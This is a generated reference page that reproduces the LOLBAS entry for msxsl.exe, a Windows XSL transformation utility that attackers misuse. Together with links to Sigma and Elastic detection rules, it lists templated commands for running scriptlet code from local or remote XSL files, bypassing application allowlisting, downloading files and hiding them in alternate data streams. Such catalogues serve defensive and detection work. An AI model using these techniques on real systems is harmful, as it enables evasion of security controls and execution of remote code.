---
parsed_by: focuslocust
source: lolbas
type: generated
---
# msxsl.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msxsl.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [msxsl.exe](../../tools/windows/msxsl.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | msxsl.exe |
| name | msxsl.exe |
| type | tool |
| source | lolbas |
| url | https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@subtee'
  Person: Casey Smith
- Handle: '@r0ns3n'
  Person: Ronnie Salomonsen
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
  Description: Run COM Scriptlet code within the script.xsl file (local).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Local execution of script stored in XSL file.
- Category: AWL Bypass
  Command: msxsl.exe {PATH:.xml} {PATH:.xsl}
  Description: Run COM Scriptlet code within the script.xsl file (local).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  Usecase: Local execution of script stored in XSL file.
- Category: Execute
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}
  Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Local execution of remote script stored in XSL script stored as an XML file.
- Category: AWL Bypass
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml}
  Description: Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).
  MitreID: T1220
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Execute: XSL
  - Execute: Remote
  Usecase: Local execution of remote script stored in XSL script stored as an XML file.
- Category: Download
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}
  Description: Using remote XML and XSL files, save the transformed XML file to disk.
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Usecase: Download a file from the internet and save it to disk.
- Category: ADS
  Command: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name
  Description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
  MitreID: T1564
  OperatingSystem: Windows
  Privileges: User
  Usecase: Download a file from the internet and save it to an NTFS Alternate Data Stream.
Created: 2018-05-25
Description: Command line utility used to perform XSL transformations.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: no default
Name: msxsl.exe
Resources:
- Link: https://twitter.com/subTee/status/877616321747271680
- Link: https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker
- Link: https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml
```

## Detection / Analysis Notes

```text
Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```

```text
Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
- Elastic: https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml
- Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
```
